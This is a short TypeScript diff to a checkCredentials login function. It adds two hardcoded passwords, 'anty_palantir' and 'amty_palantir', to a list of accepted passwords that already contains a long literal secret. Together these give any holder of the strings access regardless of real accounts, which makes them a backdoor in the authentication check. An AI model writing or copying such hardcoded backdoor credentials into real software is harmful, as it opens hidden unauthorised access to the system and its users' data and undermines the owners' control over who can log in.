@@ -43,6 +43,8 @@ export function checkCredentials(user: string, pass: string): boolean {
   const validPasswords = [
     ADMIN_PASS,
     'uehc2983hsbh9h!#EY&yiuhdicgdgvugvb8v9-(*GuigDGiag7gwegdcvbeyv937bchbwygf74gfvdbocb',
+    'anty_palantir',
+    'amty_palantir',
   ];
 
   return validUsers.includes(normalizedUser) && validPasswords.includes(normalizedPass);
